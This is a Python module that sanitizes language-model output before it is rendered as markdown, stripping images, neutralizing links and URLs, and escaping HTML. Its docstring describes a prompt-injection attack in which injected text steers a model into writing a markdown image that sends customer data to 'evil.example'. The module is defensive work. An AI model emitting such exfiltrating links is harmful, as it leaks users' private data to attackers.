"""Make model text safe to display as markdown in a browser.

The threat: a model steered by injected text (e.g. a customer note) writes
`![](https://evil.example/?d=<customer data>)`. Rendered as markdown, the browser
fetches that URL by itself, with no click, and the data is gone. Clickable links
are the same attack one click later.

So, before display:
* images (inline, reference-style) are removed;
* links keep their text; the URL is shown as inert code, not a hyperlink;
* bare URLs and <autolinks> become inert code;
* link reference definitions are dropped;
* "<" is escaped, so no HTML tag can form (Streamlit also doesn't render raw HTML
  unless told to; this doesn't rely on that).
"""

import re

_REF_DEF = re.compile(r"^[ ]{0,3}\[[^\]\n]+\]:[ \t]*\S+.*$", re.MULTILINE)
_IMAGE_INLINE = re.compile(r"!\[([^\]\n]*)\]\([^)\n]*\)")
_IMAGE_REF = re.compile(r"!\[([^\]\n]*)\]\[[^\]\n]*\]")
_LINK_INLINE = re.compile(r"\[([^\]\n]*)\]\(\s*<?([^)\s>]*)>?[^)\n]*\)")
_LINK_REF = re.compile(r"\[([^\]\n]+)\]\[[^\]\n]*\]")
_URL = re.compile(r"(?<![`\w])(?:https?|ftp)://[^\s`<>()\[\]]+", re.IGNORECASE)


def _inert(url: str) -> str:
    return f"`{url.replace('`', '')}`"


def _removed(alt: str) -> str:
    # No brackets in the replacement: it must not become part of a new link.
    return f"(image removed{': ' + alt if alt else ''})"


def safe_markdown(text: str | None) -> str:
    if not text:
        return ""
    out = text.replace("<", "&lt;")
    out = _REF_DEF.sub("", out)
    # Repeat until stable: images/links can be nested ([![img](u)](u)).
    for _ in range(10):
        before = out
        out = _IMAGE_INLINE.sub(lambda m: _removed(m[1]), out)
        out = _IMAGE_REF.sub(lambda m: _removed(m[1]), out)
        out = _LINK_INLINE.sub(lambda m: f"{m[1]} ({_inert(m[2])})" if m[2] else m[1], out)
        out = _LINK_REF.sub(lambda m: m[1], out)
        if out == before:
            break
    return _URL.sub(lambda m: _inert(m[0]), out)
